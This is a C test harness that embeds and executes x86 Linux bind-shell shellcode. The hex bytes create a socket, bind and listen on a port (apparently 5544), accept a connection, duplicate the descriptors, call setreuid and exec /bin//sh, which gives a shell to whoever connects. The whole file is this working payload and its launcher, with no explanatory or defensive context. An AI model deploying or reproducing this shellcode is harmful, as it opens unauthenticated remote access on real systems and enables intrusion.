#include<stdio.h>
#include<string.h>
char code[]=\
"\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02"
"\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x52\x68\x15\xa8\x00\x00\x66\x53"
"\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xff\x5a\x57\x52\xb3\x04"
"\x89\xe1\xb0\x66\xcd\x80\x57\x57\x52\x89\xe1\xb3\x05\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x46\x31\xdb\x31\xc9"
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53"
"\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";

int main()
{
printf("Shellcode length=%d\n",strlen(code));

/* Pollutes all registers ensuring that 
   the shellcode runs in any circumstance.
   Author-->Geyslan G.Bem     */

__asm__ ("movl $0xffffffff, %eax\n\t"              
 "movl %eax, %ebx\n\t"
 "movl %eax, %ecx\n\t"
 "movl %eax, %edx\n\t"
 "movl %eax, %esi\n\t"          
 "movl %eax, %edi\n\t"
 "movl %eax, %ebp");
	int (*func)();
	func=(int(*)())code;
	(int)(*func)();	
}
